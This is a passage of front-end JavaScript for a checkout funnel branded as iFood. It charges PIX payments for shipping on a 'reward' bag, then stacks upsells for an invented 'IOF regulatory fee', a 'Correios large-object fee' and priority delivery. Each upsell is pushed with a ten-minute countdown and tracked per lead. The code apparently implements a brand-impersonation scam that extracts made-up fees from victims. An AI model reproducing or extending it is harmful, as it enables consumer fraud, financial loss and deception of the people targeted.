                addrNumber.classList.toggle('input-dim', noNumber.checked);
                saveAddressExtra(collectExtraAddress());
                updateSummaryAddress();
            });
        }
        if (noComplement && addrComplement) {
            noComplement.addEventListener('change', () => {
                addrComplement.disabled = noComplement.checked;
                addrComplement.classList.toggle('input-dim', noComplement.checked);
                saveAddressExtra(collectExtraAddress());
                updateSummaryAddress();
            });
        }
        [addrNumber, addrComplement, addrReference].forEach((input) => {
            input?.addEventListener('input', () => {
                saveAddressExtra(collectExtraAddress());
                updateSummaryAddress();
            });
        });
    };

    const collectExtraAddress = () => ({
        number: addrNumber?.value.trim() || '',
        complement: addrComplement?.value.trim() || '',
        reference: addrReference?.value.trim() || '',
        noNumber: !!noNumber?.checked,
        noComplement: !!noComplement?.checked
    });

    const selectShipping = (opt, options, flags = {}) => {
        const autoRestore = flags?.autoRestore === true;
        const autoDefault = flags?.autoDefault === true;
        const shouldTrack = flags?.track !== false;
        const basePrice = Number(opt.originalPrice || opt.basePrice || opt.price || 0);
        const selectedShipping = {
            ...opt,
            id: String(opt.id || 'padrao').trim() || 'padrao',
            name: String(opt.name || 'Frete iFood').trim() || 'Frete iFood',
            price: Number(Number(opt.price || 0).toFixed(2)),
            basePrice: Number(basePrice.toFixed(2)),
            originalPrice: Number(basePrice.toFixed(2)),
            selectedAt: Number(opt.selectedAt || 0) > 0 ? Number(opt.selectedAt) : Date.now(),
            selectedByUser: autoRestore ? (opt.selectedByUser !== false) : !autoDefault,
            sessionId: getLeadSessionId()
        };
        saveShipping(selectedShipping);
        cachedSelectedId = selectedShipping.id;
        shipping = selectedShipping;
        if (shouldTrack) {
            trackLead('frete_selected', { stage: 'checkout', shipping: selectedShipping });
        }
        updateCheckoutTotals(selectedShipping);
        const labels = freightOptions?.querySelectorAll('.freight-option') || [];
        labels.forEach((label) => {
            label.classList.toggle('freight-option--active', label.querySelector('input')?.value === selectedShipping.id);
        });
        updateCheckoutActionPanel();
    };

    const clearShippingSelection = () => {
        localStorage.removeItem(STORAGE_KEYS.shipping);
        shipping = null;
        cachedSelectedId = null;
        if (freightOptions) freightOptions.innerHTML = '';
        setHidden(freightOptions, true);
        setHidden(freightHint, true);
        updateCheckoutTotals(null);
        updateCheckoutActionPanel();
    };

    const calcShipping = () => {
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) {
            showToast('Digite um CEP válido para calcular o frete.', 'error');
            return;
        }

        const finishCalc = () => {
            setHidden(freightLoading, true);
            if (btnCalcFreight) {
                btnCalcFreight.disabled = false;
            }
            setHidden(summaryBlock, false);
            setHidden(freightForm, false);
            setHidden(freightAddress, false);
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
            openFreightOptions(rawCep, true);
        };

        if (hasResolvedAddressForCep(rawCep)) {
            if (summaryCep) summaryCep.textContent = formatCep(rawCep);
            updateSummaryAddress();
            updateFreightAddress(address);
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
            finishCalc();
            return;
        }

        if (btnCalcFreight) {
            btnCalcFreight.classList.add('hidden');
        }
        clearShippingSelection();
        if (btnCalcFreight) {
            btnCalcFreight.disabled = true;
        }
        setHidden(freightLoading, false);
        setHidden(freightAddress, true);
        setHidden(freightOptions, true);
        updateCheckoutTotals(null);
        updateCheckoutActionPanel();

        if (summaryCep) summaryCep.textContent = formatCep(rawCep);

        const startTime = Date.now();
        const minDelay = 900;

        fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
            .then((res) => {
                if (!res.ok) throw new Error('CEP não encontrado');
                return res.json();
            })
            .then((data) => {
                const street = (data.street || '').trim();
                const neighborhood = (data.neighborhood || '').trim();
                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
                const city = (data.city || 'Cidade não informada').trim();
                const stateUf = (data.state || '').trim();
                const cityLine = stateUf ? `${city} - ${stateUf}` : city;

                const updatedAddress = {
                    ...(address || {}),
                    streetLine,
                    cityLine,
                    cep: formatCep(rawCep),
                    street,
                    neighborhood,
                    city,
                    state: stateUf
                };

                saveAddress(updatedAddress);
                if (address) {
                    address.streetLine = updatedAddress.streetLine;
                    address.cityLine = updatedAddress.cityLine;
                    address.cep = updatedAddress.cep;
                } else {
                    address = updatedAddress;
                }
                updateSummaryAddress();
                updateFreightAddress(updatedAddress);
                trackLead('frete_calculated', { stage: 'checkout', address: updatedAddress });
                setHidden(freightDetails, false);
                setHidden(summaryBlock, false);
                if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
                setHidden(freightForm, false);
                hydrateExtraAddress();
                bindExtraAddress();

                const elapsed = Date.now() - startTime;
                const remaining = Math.max(0, minDelay - elapsed);
                setTimeout(() => {
                    finishCalc();
                }, remaining);
            })
            .catch(() => {
                const elapsed = Date.now() - startTime;
                const remaining = Math.max(0, minDelay - elapsed);
                setTimeout(() => {
                    showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
                    setHidden(freightLoading, true);
                    if (btnCalcFreight) {
                        btnCalcFreight.classList.remove('hidden');
                        btnCalcFreight.disabled = false;
                    }
                    updateCheckoutActionPanel();
                }, remaining);
            });
    };

    btnCalcFreight?.addEventListener('click', calcShipping);

    btnVerifyFreight?.addEventListener('click', () => {
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) {
            showToast('Digite um CEP válido para continuar.', 'error');
            return;
        }
        openFreightOptions(rawCep, true);
        if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
    });

    if (shipping && freightOptions) {
        cachedOptions = buildShippingOptions((checkoutCep?.value || '').replace(/\D/g, ''));
        cachedSelectedId = shipping.id;
        setHidden(summaryBlock, false);
        setHidden(freightForm, true);
        showFreightSelection();
        updateCheckoutTotals(shipping);
        updateCheckoutActionPanel();
    }

    if (!shipping) {
        hydrateExtraAddress();
        bindExtraAddress();
        const savedCepDigits = getCepDigits(address?.cep || '');
        if (savedCepDigits.length === 8 && hasResolvedAddressForCep(savedCepDigits)) {
            if (checkoutCep) checkoutCep.value = formatCep(savedCepDigits);
            updateFreightAddress(address);
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
            setHidden(summaryBlock, false);
            setHidden(freightForm, false);
            openFreightOptions(savedCepDigits, false);
        }
    }

    updateCheckoutTotals(shipping);
    updateCheckoutActionPanel();

    const syncShippingAfterAddressEdit = () => {
        const storedAddress = loadAddress();
        const storedShipping = loadShipping();
        if (!storedAddress) return;

        if (summaryAddress) {
            summaryAddress.textContent = formatSummaryAddress();
        }
        if (summaryCep) summaryCep.textContent = storedAddress.cep || '-';

        updateFreightAddress(storedAddress);
        setHidden(freightDetails, false);
        hydrateExtraAddress();
        bindExtraAddress();

        if (storedShipping && freightOptions && isShippingSelectionComplete(storedShipping)) {
            cachedOptions = buildShippingOptions((storedAddress.cep || '').replace(/\D/g, ''));
            cachedSelectedId = storedShipping.id;
            setHidden(freightForm, true);
            setHidden(summaryBlock, false);
            showFreightSelection();
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            shipping = storedShipping;
            updateCheckoutTotals(storedShipping);
            updateCheckoutActionPanel();
            return;
        }

        shipping = null;
        setHidden(summaryBlock, false);
        setHidden(freightForm, true);
        if (cachedOptions) showFreightSelection();
        if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
        updateCheckoutTotals(null);
        updateCheckoutActionPanel();
    };

    const returnTo = getReturnTarget();
    if (returnTo === 'checkout') {
        sessionStorage.removeItem(STORAGE_KEYS.returnTo);
        syncShippingAfterAddressEdit();
    }

    btnFinish?.addEventListener('click', () => {
        if (!btnFinish) return;
        if (!shipping) {
            showToast('Selecione um frete para continuar.', 'error');
            freightCard?.classList.remove('freight-card--focus');
            freightCard?.classList.add('freight-card--focus');
            setTimeout(() => {
                freightCard?.classList.remove('freight-card--focus');
            }, 1100);
            if (freightOptions && !freightOptions.classList.contains('hidden')) {
                freightOptions.scrollIntoView({ behavior: 'smooth', block: 'center' });
            } else if (checkoutCep) {
                checkoutCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
                checkoutCep.focus();
            }
            return;
        }
        saveBump(checkoutNeutralBump);
        trackLead('checkout_submit', {
            stage: 'checkout',
            shipping,
            bump: checkoutNeutralBump,
            reward,
            amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
        });
        const idleLabel = btnFinish.textContent;
        checkoutSubmitting = true;
        btnFinish.textContent = 'Processando...';
        updateCheckoutActionPanel();
        orderBumpEnabledPromise
            .then((enabled) => {
                if (enabled) {
                    setStage('orderbump');
                    redirect('orderbump.html');
                    return;
                }
                trackLead('orderbump_skipped', {
                    stage: 'checkout',
                    shipping,
                    reward,
                    amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
                });
                showToast('Gerando pagamento...', 'success');
                createPixCharge(shipping, 0).catch((error) => {
                    showToast(error.message || 'Erro ao gerar o PIX.', 'error');
                    checkoutSubmitting = false;
                    btnFinish.textContent = idleLabel;
                    updateCheckoutActionPanel();
                });
            })
            .catch(() => {
                checkoutSubmitting = false;
                btnFinish.textContent = idleLabel;
                setStage('orderbump');
                redirect('orderbump.html');
            });
    });
}

function initOrderBump() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;
    const reward = loadRewardSelection();
    if (!reward) {
        setStage('success');
        redirect('sucesso.html');
        return;
    }

    const shippingStored = loadShipping();
    const shipping = applyCouponToShipping(shippingStored);
    const rewardExtraPrice = getRewardExtraPrice(reward);
    if (!isShippingSelectionComplete(shipping)) {
        localStorage.removeItem(STORAGE_KEYS.shipping);
        setStage('checkout');
        redirect('checkout.html?forceFrete=1');
        return;
    }

    const neutralBump = {
        selected: false,
        price: 0,
        title: 'Seguro Bag'
    };
    saveBump(neutralBump);
    setStage('orderbump');
    trackLead('orderbump_view', {
        stage: 'orderbump',
        shipping,
        reward,
        bump: neutralBump,
        amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
    });
    const bumpPrice = 9.9;

    isOrderBumpEnabled().then((enabled) => {
        if (!enabled) {
            trackLead('orderbump_skipped', {
                stage: 'orderbump',
                shipping,
                reward,
                amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
            });
            createPixCharge(shipping, 0).catch((error) => {
                showToast(error.message || 'Erro ao gerar o PIX.', 'error');
                setStage('checkout');
                redirect('checkout.html');
            });
        }
    }).catch(() => null);

    const btnAccept = document.getElementById('btn-bump-accept');
    const btnDecline = document.getElementById('btn-bump-decline');
    const bumpTotal = document.getElementById('bump-total');
    const bumpMonthly = document.getElementById('bump-monthly');
    const bumpLoading = document.getElementById('bump-loading');

    if (bumpTotal) bumpTotal.textContent = formatCurrency(shipping.price + rewardExtraPrice + bumpPrice);
    if (bumpMonthly) bumpMonthly.textContent = formatCurrency(bumpPrice);

    const proceedToPix = (selected) => {
        if (btnAccept) btnAccept.disabled = true;
        if (btnDecline) btnDecline.disabled = true;
        if (bumpLoading) bumpLoading.classList.remove('hidden');

        saveBump({
            selected,
            price: bumpPrice,
            title: 'Seguro Bag'
        });
        trackLead(selected ? 'orderbump_accepted' : 'orderbump_declined', {
            stage: 'orderbump',
            bump: loadBump(),
            shipping,
            reward,
            amount: Number((Number(shipping?.price || 0) + rewardExtraPrice + (selected ? bumpPrice : 0)).toFixed(2))
        });

        createPixCharge(shipping, selected ? bumpPrice : 0)
            .catch((error) => {
                showToast(error.message || 'Erro ao gerar o PIX. Tente novamente.', 'error');
                if (btnAccept) btnAccept.disabled = false;
                if (btnDecline) btnDecline.disabled = false;
                if (bumpLoading) bumpLoading.classList.add('hidden');
            });
    };

    btnAccept?.addEventListener('click', () => proceedToPix(true));
    btnDecline?.addEventListener('click', () => proceedToPix(false));
}

function initUpsellIof() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('upsell_iof');
    const personal = loadPersonal();
    const shippingStored = loadShipping();
    const shipping = isShippingSelectionComplete(shippingStored) ? shippingStored : null;
    const pix = loadPix();
    const offerPrice = 17.73;

    trackLead('upsell_iof_view', { stage: 'upsell_iof', shipping, pix, offerPrice });

    const leadName = document.getElementById('upsell-iof-lead-name');
    const currentFrete = document.getElementById('upsell-iof-current-frete');
    const currentTxid = document.getElementById('upsell-iof-current-txid');
    const btnAccept = document.getElementById('btn-upsell-iof-accept') || document.getElementById('confirmation-button');
    const btnSkip = document.getElementById('btn-upsell-iof-skip');
    const loading = document.getElementById('upsell-iof-loading') || document.getElementById('pixLoading');
    const timerLabel = document.getElementById('upsell-iof-timer');
    const iofPriceLabels = Array.from(
        new Set([
            ...Array.from(document.querySelectorAll('#upsell-iof-price')),
            ...Array.from(document.querySelectorAll('#price'))
        ])
    );
    const acceptIdleLabel = btnAccept?.textContent || `Pagar taxa de IOF de ${formatCurrency(offerPrice)}`;
    let submitInFlight = false;

    if (leadName && personal?.name) {
        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
        leadName.textContent = firstName || 'Parceiro';
    }
    if (currentFrete) {
        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
    }
    if (currentTxid) {
        const txid = String(pix?.idTransaction || '').trim();
        currentTxid.textContent = txid ? txid.slice(-8) : '--';
    }
    iofPriceLabels.forEach((el) => {
        if (!el) return;
        el.textContent = formatCurrency(offerPrice);
    });

    const setLoading = (active) => {
        if (btnAccept) btnAccept.disabled = active;
        if (btnSkip) btnSkip.disabled = active;
        if (loading) loading.classList.toggle('hidden', !active);
    };

    const startCountdown = () => {
        if (!timerLabel) return;
        const storageKey = 'ifood_upsell_iof_deadline_ts';
        const now = Date.now();
        const fallbackDeadline = now + (10 * 60 * 1000);
        const savedRaw = Number(sessionStorage.getItem(storageKey) || 0);
        const deadline = savedRaw > now ? savedRaw : fallbackDeadline;
        sessionStorage.setItem(storageKey, String(deadline));

        const render = () => {
            const diff = Math.max(0, deadline - Date.now());
            const totalSeconds = Math.floor(diff / 1000);
            const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
            const ss = String(totalSeconds % 60).padStart(2, '0');
            timerLabel.textContent = `${mm}:${ss}`;
            return diff > 0;
        };

        render();
        const interval = window.setInterval(() => {
            const keep = render();
            if (!keep) window.clearInterval(interval);
        }, 1000);
    };

    const goToSecondUpsell = () => {
        setStage('upsell_correios');
        redirect('upsell-correios.html');
    };

    const handleAccept = async (event) => {
        event?.preventDefault?.();
        if (submitInFlight) return false;
        submitInFlight = true;

        const iofShipping = {
            id: 'taxa_iof_bag',
            name: 'Taxa regulatoria IOF da BAG',
            eta: 'Regularizacao imediata',
            price: offerPrice
        };

        setLoading(true);
        trackLead('upsell_iof_accept', {
            stage: 'upsell_iof',
            shipping: iofShipping,
            baseShipping: shipping || null,
            previousPix: pix || null,
            amount: offerPrice
        });

        try {
            if (btnAccept) btnAccept.textContent = 'Gerando PIX da taxa de IOF...';
            await createPixCharge(iofShipping, 0, {
                sourceStage: 'upsell_iof',
                upsell: {
                    enabled: true,
                    kind: 'taxa_iof_bag',
                    title: 'Taxa de IOF da BAG',
                    price: offerPrice,
                    previousTxid: String(pix?.idTransaction || '').trim(),
                    targetAfterPaid: 'upsell-correios.html'
                }
            });
        } catch (error) {
            if (btnAccept) btnAccept.textContent = acceptIdleLabel;
            showToast(error.message || 'Nao foi possivel gerar o PIX da taxa de IOF.', 'error');
            setLoading(false);
            submitInFlight = false;
            return false;
        }

        return false;
    };

    startCountdown();

    if (btnAccept) {
        btnAccept.removeAttribute('onclick');
        btnAccept.addEventListener('click', handleAccept);
    }
    window.initiateCheckout = handleAccept;

    btnSkip?.addEventListener('click', () => {
        trackLead('upsell_iof_decline', { stage: 'upsell_iof', shipping, pix, amount: offerPrice });
        showToast('Sem problemas. Vamos para o proximo passo.', 'info');
        goToSecondUpsell();
    });
}

function initUpsellCorreios() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('upsell_correios');
    const personal = loadPersonal();
    const shippingStored = loadShipping();
    const shipping = isShippingSelectionComplete(shippingStored) ? shippingStored : null;
    const pix = loadPix();
    const offerPrice = 15.96;

    trackLead('upsell_correios_view', { stage: 'upsell_correios', shipping, pix, offerPrice });

    const leadName = document.getElementById('upsell-correios-lead-name');
    const currentFrete = document.getElementById('upsell-correios-current-frete');
    const currentTxid = document.getElementById('upsell-correios-current-txid');
    const btnAccept = document.getElementById('btn-upsell-correios-accept');
    const btnSkip = document.getElementById('btn-upsell-correios-skip');
    const loading = document.getElementById('upsell-correios-loading');
    const timerLabel = document.getElementById('upsell-correios-timer');
    const priceLabels = Array.from(
        document.querySelectorAll('[data-upsell-correios-price], #upsell-correios-price')
    );
    const acceptIdleLabel = btnAccept?.textContent || `Pagar taxa de objeto grande ${formatCurrency(offerPrice)}`;
    let submitInFlight = false;

    if (leadName && personal?.name) {
        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
        leadName.textContent = firstName || 'Parceiro';
    }
    if (currentFrete) {
        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
    }
    if (currentTxid) {
        const txid = String(pix?.idTransaction || '').trim();
        currentTxid.textContent = txid ? txid.slice(-8) : '--';
    }
    priceLabels.forEach((el) => {
        if (!el) return;
        el.textContent = formatCurrency(offerPrice);
    });

    const setLoading = (active) => {
        if (btnAccept) btnAccept.disabled = active;
        if (btnSkip) btnSkip.disabled = active;
        if (loading) loading.classList.toggle('hidden', !active);
    };

    const startCountdown = () => {
        if (!timerLabel) return;
        const storageKey = 'ifood_upsell_correios_deadline_ts';
        const now = Date.now();
        const fallbackDeadline = now + (10 * 60 * 1000);
        const savedRaw = Number(sessionStorage.getItem(storageKey) || 0);
        const deadline = savedRaw > now ? savedRaw : fallbackDeadline;
        sessionStorage.setItem(storageKey, String(deadline));

        const render = () => {
            const diff = Math.max(0, deadline - Date.now());
            const totalSeconds = Math.floor(diff / 1000);
            const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
            const ss = String(totalSeconds % 60).padStart(2, '0');
            timerLabel.textContent = `${mm}:${ss}`;
            return diff > 0;
        };

        render();
        const interval = window.setInterval(() => {
            const keep = render();
            if (!keep) window.clearInterval(interval);
        }, 1000);
    };

    const goToThirdUpsell = () => {
        setStage('upsell');
        redirect('upsell.html');
    };

    btnAccept?.addEventListener('click', async () => {
        if (submitInFlight) return;
        submitInFlight = true;

        const correiosShipping = {
            id: 'taxa_objeto_grande_correios',
            name: 'Taxa de objeto grande dos Correios',
            eta: 'Despacho com validacao de tamanho',
            price: offerPrice
        };

        setLoading(true);
        trackLead('upsell_correios_accept', {
            stage: 'upsell_correios',
            shipping: correiosShipping,
            baseShipping: shipping || null,
            previousPix: pix || null,
            amount: offerPrice
        });

        try {
            btnAccept.textContent = 'Gerando PIX da taxa dos Correios...';
            await createPixCharge(correiosShipping, 0, {
                sourceStage: 'upsell_correios',
                upsell: {
                    enabled: true,
                    kind: 'taxa_objeto_grande_correios',
                    title: 'Taxa de objeto grande dos Correios',
                    price: offerPrice,
                    previousTxid: String(pix?.idTransaction || '').trim(),
                    targetAfterPaid: 'upsell.html'
                }
            });
        } catch (error) {
            btnAccept.textContent = acceptIdleLabel;
            showToast(error.message || 'Nao foi possivel gerar o PIX da taxa dos Correios.', 'error');
            setLoading(false);
            submitInFlight = false;
        }
    });

    btnSkip?.addEventListener('click', () => {
        trackLead('upsell_correios_decline', { stage: 'upsell_correios', shipping, pix, amount: offerPrice });
        showToast('Tudo certo. Vamos para o adiantamento de frete.', 'info');
        goToThirdUpsell();
    });

    startCountdown();
}

function initUpsell() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('upsell');
    const personal = loadPersonal();
    const shippingStored = loadShipping();
    const shipping = isShippingSelectionComplete(shippingStored) ? shippingStored : null;
    const pix = loadPix();
    const offerPrice = 18.98;
    const query = new URLSearchParams(window.location.search || '');
    const paidMode = query.get('paid') === '1';

    trackLead('upsell_view', { stage: 'upsell', shipping, pix, offerPrice });

    const leadName = document.getElementById('upsell-lead-name');
    const currentFrete = document.getElementById('upsell-current-frete');
    const currentTxid = document.getElementById('upsell-current-txid');
    const btnAccept = document.getElementById('btn-upsell-accept');
    const btnSkip = document.getElementById('btn-upsell-skip');
    const loading = document.getElementById('upsell-loading');
    const subtitle = document.querySelector('.upsell-subtitle');
    const highlightRow = document.querySelector('.upsell-summary__row--highlight');
    const upsellStep = document.querySelector('.upsell-step');
    const urgencyCard = document.getElementById('upsell-urgency');
    const deliveryGrid = document.getElementById('upsell-delivery-grid');
    const timerLabel = document.getElementById('upsell-timer');
    const benefitsList = document.getElementById('upsell-benefits');

    if (leadName && personal?.name) {
        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
        leadName.textContent = firstName || 'Parceiro';
    }
    if (currentFrete) {
        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
    }
    if (currentTxid) {
        const txid = String(pix?.idTransaction || '').trim();
        currentTxid.textContent = txid ? txid.slice(-8) : '--';
    }

    const setLoading = (active) => {
        if (btnAccept) btnAccept.disabled = active;
        if (btnSkip) btnSkip.disabled = active;
        if (loading) loading.classList.toggle('hidden', !active);
    };

    const startUpsellCountdown = () => {
        if (!timerLabel) return;
        const storageKey = 'ifood_upsell_deadline_ts';
        const now = Date.now();
        const fallbackDeadline = now + (10 * 60 * 1000);
        const savedRaw = Number(sessionStorage.getItem(storageKey) || 0);
        const deadline = savedRaw > now ? savedRaw : fallbackDeadline;
        sessionStorage.setItem(storageKey, String(deadline));

        const render = () => {
            const diff = Math.max(0, deadline - Date.now());
            const totalSeconds = Math.floor(diff / 1000);
            const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
            const ss = String(totalSeconds % 60).padStart(2, '0');
            timerLabel.textContent = `${mm}:${ss}`;
            if (diff <= 0 && urgencyCard) {
                urgencyCard.classList.add('upsell-urgency--expired');
            }
            return diff > 0;
        };

        render();
        const interval = window.setInterval(() => {
            const keep = render();
            if (!keep) window.clearInterval(interval);
        }, 1000);
    };

    if (paidMode) {
        if (upsellStep) {
            upsellStep.classList.add('upsell-step--paid');
        }
        if (subtitle) {
            subtitle.textContent = 'Pagamento confirmado. Sua prioridade de envio foi ativada e sua bag entra no proximo lote.';
        }
        if (highlightRow) {
            highlightRow.innerHTML = '<span>Status da prioridade</span><strong class="text-success">Confirmado</strong>';
        }
        if (btnAccept) {
            btnAccept.textContent = 'Prioridade ativa';
            btnAccept.disabled = true;
        }
        if (btnSkip) {
            btnSkip.classList.add('hidden');
        }
        if (urgencyCard) urgencyCard.classList.add('hidden');
        if (deliveryGrid) deliveryGrid.classList.add('hidden');
        if (benefitsList) {
            benefitsList.innerHTML = [
                'Recebimento prioritario confirmado para esta bag',
                'Seu pedido foi movido para o proximo lote de saida',
                'Acompanhe o rastreio para a previsao final de entrega'
            ].map((text) => `<li>${text}</li>`).join('');
        }
        trackLead('upsell_paid_view', { stage: 'upsell', shipping, pix });
        return;
    }

    startUpsellCountdown();

    btnAccept?.addEventListener('click', async () => {
        const expressShipping = {
            id: 'expresso_1dia',
            name: 'Adiantamento logistica (1 dia)',
            eta: 'Recebimento em 1 dia',
            price: offerPrice
        };

        setLoading(true);
        trackLead('upsell_accept', {
            stage: 'upsell',
            shipping: expressShipping,
            baseShipping: shipping || null,
            previousPix: pix || null
        });

        try {
            btnAccept.textContent = 'Gerando PIX da prioridade...';
            await createPixCharge(expressShipping, 0, {
                sourceStage: 'upsell',
                upsell: {
                    enabled: true,
                    kind: 'frete_1dia',
                    title: 'Prioridade de envio',
                    price: offerPrice,
                    previousTxid: String(pix?.idTransaction || '').trim(),
                    targetAfterPaid: 'upsell.html?paid=1'
                }
            });
        } catch (error) {
            btnAccept.textContent = 'Quero receber em 1 dia por R$ 18,98';
            showToast(error.message || 'Nao foi possivel gerar o PIX de adiantamento.', 'error');
            setLoading(false);
        }
    });

    btnSkip?.addEventListener('click', () => {
        trackLead('upsell_decline', { stage: 'upsell', shipping, pix });
        showToast('Tudo certo. Mantemos o prazo padrao da sua entrega.', 'success');
        btnSkip.disabled = true;
    });
}

function initPix() {
    const pix = loadPix();
    const shipping = loadShipping();
    const storedReward = loadRewardSelection();
    const shouldAutoCreateFromOrderbumpBack = sessionStorage.getItem(STORAGE_KEYS.orderbumpBackAutoPix) === '1';
    const pixTopbar = document.querySelector('.pix-topbar');
    const pixHero = document.querySelector('.pix-hero');
    const pixHeading = document.querySelector('.pix-heading');
    const pixInstructions = document.querySelector('.pix-instructions');
    const pixQr = document.getElementById('pix-qr');
    const pixCode = document.getElementById('pix-code');
    const pixAmount = document.getElementById('pix-amount');
    const pixEmpty = document.getElementById('pix-empty');
    const pixCard = document.getElementById('pix-card');
    const pixTimer = document.getElementById('pix-timer');
    const pixProgress = document.getElementById('pix-progress-bar');
    const pixQrSection = document.getElementById('pix-qr-section');
    const pixOrderId = document.getElementById('pix-order-id');
    const pixOrderTitle = document.getElementById('pix-order-title');
    const pixOrderImage = document.getElementById('pix-order-image');
    const btnCopy = document.getElementById('btn-copy-pix');
    const btnShowPixQr = document.getElementById('btn-show-pix-qr');
    const btnCopyIcon = document.getElementById('btn-copy-pix-icon');
    const pixIofView = document.getElementById('pix-iof-view');
    const pixIofQr = document.getElementById('pix-iof-qr');
    const pixIofCode = document.getElementById('pix-iof-code');
    const pixIofAmount = document.getElementById('pix-iof-amount');
    const pixIofStatus = document.getElementById('pix-iof-status');
    const btnCopyIof = document.getElementById('btn-copy-pix-iof');
    const pixCorreiosView = document.getElementById('pix-correios-view');
    const pixCorreiosQr = document.getElementById('pix-correios-qr');
    const pixCorreiosCode = document.getElementById('pix-correios-code');
    const pixCorreiosAmount = document.getElementById('pix-correios-amount');
    const pixCorreiosStatus = document.getElementById('pix-correios-status');
    const btnCopyCorreios = document.getElementById('btn-copy-pix-correios');
    const reward = resolveRewardSelection({
        id: pix?.rewardId || pix?.reward?.id || storedReward?.id || 'bag',
        selectedAt: storedReward?.selectedAt || 0
    });
    const rewardExtraPrice = Number(pix?.rewardExtraPrice || getRewardExtraPrice(reward));

    const isUpsellPix = Boolean(
        pix?.isUpsell ||
        pix?.upsell?.enabled ||
        String(pix?.shippingId || '').trim() === 'expresso_1dia' ||
        /adiantamento|prioridade|expresso|correio|objeto grande/i.test(String(pix?.shippingName || ''))
    );
    const upsellKind = String(pix?.upsell?.kind || '').trim().toLowerCase();
    const upsellTargetAfterPaid = String(pix?.upsell?.targetAfterPaid || '').trim();
    const isIofUpsellPix = Boolean(
        isUpsellPix && (
            /iof/.test(upsellKind) ||
            /iof/.test(String(pix?.shippingId || '').toLowerCase()) ||
            /iof/.test(String(pix?.shippingName || '').toLowerCase()) ||
            /iof/.test(String(pix?.upsell?.title || '').toLowerCase())
        )
    );
    const isCorreiosUpsellPix = Boolean(
        isUpsellPix && !isIofUpsellPix && (
            /correios|objeto_grande|objeto grande/.test(upsellKind) ||
            /correios|objeto_grande|objeto grande/.test(String(pix?.shippingId || '').toLowerCase()) ||
            /correios|objeto_grande|objeto grande/.test(String(pix?.shippingName || '').toLowerCase()) ||
            /correios|objeto_grande|objeto grande/.test(String(pix?.upsell?.title || '').toLowerCase())
        )
    );

    if (pix) {
        sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
    }

    if (!pix && shouldAutoCreateFromOrderbumpBack && isShippingSelectionComplete(shipping)) {
        saveBump({
            selected: false,
            price: 0,
            title: 'Seguro Bag'
        });
        setStage('pix');
        createPixCharge(shipping, 0, { sourceStage: 'orderbump_back_fallback' })
            .catch((error) => {
                showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
                if (pixEmpty) pixEmpty.classList.remove('hidden');
                if (pixCard) pixCard.classList.add('hidden');
            });
        return;
    }
    if (!pix && shouldAutoCreateFromOrderbumpBack && !isShippingSelectionComplete(shipping)) {
        sessionStorage.removeItem(STORAGE_KEYS.orderbumpBackAutoPix);
        setStage('checkout');
        redirect('checkout.html?forceFrete=1');
        return;
    }

    if (!pix) {
        if (pixEmpty) pixEmpty.classList.remove('hidden');
        if (pixCard) pixCard.classList.add('hidden');
        return;
    }

    const useSpecialUpsellPixLayout = isIofUpsellPix || isCorreiosUpsellPix;

    if (useSpecialUpsellPixLayout) {
        if (pixTopbar) pixTopbar.classList.add('hidden');
        if (pixHero) pixHero.classList.add('hidden');
        if (pixHeading) pixHeading.classList.add('hidden');
        if (pixInstructions) pixInstructions.classList.add('hidden');
        if (pixCard) pixCard.classList.add('hidden');
    }

    if (isIofUpsellPix) {
        if (pixIofView) {
            pixIofView.classList.remove('hidden');
            pixIofView.setAttribute('aria-hidden', 'false');
        }
    } else if (pixIofView) {
        pixIofView.classList.add('hidden');
        pixIofView.setAttribute('aria-hidden', 'true');
    }

    if (isCorreiosUpsellPix) {
        if (pixCorreiosView) {
            pixCorreiosView.classList.remove('hidden');
            pixCorreiosView.setAttribute('aria-hidden', 'false');
        }
    } else if (pixCorreiosView) {
        pixCorreiosView.classList.add('hidden');
        pixCorreiosView.setAttribute('aria-hidden', 'true');
    }

    trackLead('pix_view', {
        stage: 'pix',
        shipping,
        reward,
        amount: Number(pix?.amount || 0)
    });

    if (pixAmount) pixAmount.textContent = formatCurrency(pix.amount || 0);
    if (pixIofAmount) pixIofAmount.textContent = formatCurrency(pix.amount || 0);
    if (pixCorreiosAmount) pixCorreiosAmount.textContent = formatCurrency(pix.amount || 0);
    if (pixIofStatus) pixIofStatus.textContent = 'Status: Aguardando pagamento';
    if (pixCorreiosStatus) pixCorreiosStatus.textContent = 'Status: Aguardando pagamento';
